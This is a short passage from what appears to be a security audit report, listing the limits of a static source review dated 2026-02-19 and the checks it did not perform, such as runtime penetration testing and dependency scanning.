This audit is based on static source review of the codebase as of 2026-02-19. The following were NOT tested:
- Runtime penetration testing (actual exploit verification)
- Dependency vulnerability scanning (`npm audit`)
- HTTP response header analysis on the live Vercel deployment
- Clerk SDK version security advisories
- Convex runtime isolation guarantees (SSRF findings assume standard Node.js `fetch` behavior)
